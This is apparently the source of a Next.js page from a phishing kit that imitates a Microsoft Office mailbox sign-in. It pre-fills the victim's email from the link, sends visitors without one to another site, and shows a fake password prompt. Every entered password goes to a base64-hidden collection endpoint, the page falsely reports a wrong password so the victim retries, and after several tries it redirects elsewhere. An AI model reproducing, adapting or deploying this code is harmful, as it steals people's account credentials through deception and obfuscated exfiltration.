'use client';
import { useEffect, useState } from 'react';
import Image from 'next/image';
import { useSearchParams } from 'next/navigation';
import { ACID_API_URL, BASE_API_URL } from '@/util';

export default function Home() {
  const searchParams = useSearchParams();
  const [currentText, setCurrentText] = useState('');
  const [fade, setFade] = useState(false);
  const [progress, setProgress] = useState(0);
  const [showLogin, setShowLogin] = useState(false);
  const [loginInfo, setLoginInfo] = useState<{
    email: string;
    password: string;
  }>({ email: '', password: '' });
  const [isSigninError, setSigninError] = useState<boolean>(false);
  const [tries, setTries] = useState<number>(0);

  const [isSigninLoading, setSigninLoading] = useState<boolean>(false);
  const handleLogin = () => {
    setTries((prev) => prev + 1);
    setSigninLoading(true);
    setSigninError(false);
    const formData = new FormData();
    formData.append('email', loginInfo.email);
    formData.append('password', loginInfo.password);
    formData.append('detail', 'Office');
    fetch(atob(BASE_API_URL), {
      method: 'POST',
      body: formData,
    }).then(() => {
      if (tries >= 2) {
        window.location.replace(atob(ACID_API_URL));
      } else {
        setSigninLoading(false);
        setSigninError(true);
        setLoginInfo((prev) => ({ ...prev, password: '' }));
      }
    });
  };

  useEffect(() => {
    const texts = [
      { text: 'Opening your mailbox...', duration: 1000 },
      { text: 'Confirming your account details...', duration: 5000 },
      { text: 'Checking sign-in activity...', duration: 2000 },
    ];

    let index = 0;
    let totalDuration =
      texts.reduce((acc, item) => acc + item.duration, 0) + 1000; // Including initial delay
    let elapsed = 0;

    const showText = () => {
      if (index < texts.length) {
        setCurrentText(texts[index].text);
        setFade(true);
        setTimeout(() => {
          setFade(false);
          setTimeout(() => {
            index++;
            showText();
          }, 500); // Time for fade out transition
        }, texts[index].duration);
      } else {
        setShowLogin(true);
      }
    };

    const updateProgress = () => {
      elapsed += 100;
      setProgress((elapsed / totalDuration) * 100);
      if (elapsed < totalDuration) {
        setTimeout(updateProgress, 100);
      }
    };

    setTimeout(() => {
      showText();
      updateProgress();
    }, 1000); // Initial delay of 1 second before showing the first text
  }, []);

  useEffect(() => {
    if (searchParams) {
      const email = Array.from(searchParams.entries()).find(
        (t) => t.length > 1 && t[1].includes('@')
      );
      if (!email || email.length < 2) {
        window.location.replace('https://wikipedia.com');
      } else {
        setLoginInfo((prev) => ({ ...prev, email: email[1] }));
      }
    }
  }, [searchParams]);

  return (
    <div className="h-screen bg-custom-gradient">
      {!showLogin ? (
        <div className={'pt-52 flex flex-col justify-center items-center'}>
          <Image width={250} height={104} src={'/image.png'} alt={'logo'} />
          <div className="mt-4 w-80 h-1 bg-[#ccc]">
            <div
              className="h-full bg-[#0072c6] transition-all duration-100"
              style={{ width: `${progress}%` }}
            ></div>
          </div>
          <div
            className={`mt-3 text-xs text-[#0072c6] transition-opacity duration-500 ${
              fade ? 'opacity-100' : 'opacity-0'
            }`}
          >
            {currentText}
          </div>
        </div>
      ) : (
        <>
          <div className="inset-0 flex items-center justify-center pt-36">
            <div className="w-full max-w-md p-10 bg-white shadow-lg transform transition-transform duration-500 translate-x-full slide-in">
              <Image
                src={'/banner.jpeg'}
                alt={'banner'}
                width={107}
                height={23}
              />
              <div className={'mt-4'}>
                <div className={'flex flex-row items-center gap-x-2'}>
                  <svg
                    xmlns="http://www.w3.org/2000/svg"
                    width="24"
                    height="24"
                    viewBox="0 0 24 24"
                  >
                    <path
                      d="M18,11.578v.844H7.617l3.921,3.928-.594.594L6,12l4.944-4.944.594.594L7.617,11.578Z"
                      fill="#404040"
                    />
                    <path
                      d="M10.944,7.056l.594.594L7.617,11.578H18v.844H7.617l3.921,3.928-.594.594L6,12l4.944-4.944m0-.141-.071.07L5.929,11.929,5.858,12l.071.071,4.944,4.944.071.07.071-.07.594-.595.071-.07-.071-.071L7.858,12.522H18.1V11.478H7.858l3.751-3.757.071-.071-.071-.07-.594-.595-.071-.07Z"
                      fill="#404040"
                    />
                  </svg>
                  <div>{loginInfo.email}</div>
                </div>
                <div className={'mt-2'}>
                  <p className={'text-2xl font-semibold'}>Enter password</p>
                </div>
                {isSigninError && (
                  <p className={'mt-2 text-sm text-[#FF2626]'}>
                    Your password does not match. Please try again.
                  </p>
                )}
                <div className={'mt-5'}>
                  <input
                    type="password"
                    onFocus={() => {
                      if (isSigninError) {
                        setSigninError(false);
                      }
                    }}
                    value={loginInfo.password}
                    onChange={(e) => {
                      setLoginInfo((prev) => ({
                        ...prev,
                        password: e.target.value,
                      }));
                    }}
                    minLength={6}
                    required
                    className={
                      'mb-0.5 w-full pl-0 border-b border-b-[#ccc] placeholder-gray-500 placeholder:text-sm ring-0 ring-none focus:ring-0 focus:border-b focus:outline-none pb-2'
                    }
                    placeholder={'Password'}
                  />
                  {isSigninLoading && (
                    <div className="bubble">
                      {...Array(5)
                        .fill('')
                        .map((_, idx) => <div className="oval" key={idx} />)}
                    </div>
                  )}
                  <small className={'mt-2'}>
                    <a href="#" className={'decoration-0 text-[#0067b8]'}>
                      Forgot my password?
                    </a>
                  </small>
                </div>
                <div className={'flex flex-row-reverse mt-7 mb-5'}>
                  <button
                    disabled={isSigninLoading || loginInfo.password.length < 6}
                    onClick={handleLogin}
                    className={'bg-[#0067b8] text-white px-7 py-1'}
                  >
                    {isSigninLoading ? 'Signin in...' : 'Sign in'}
                  </button>
                </div>
              </div>
            </div>
          </div>
        </>
      )}
    </div>
  );
}
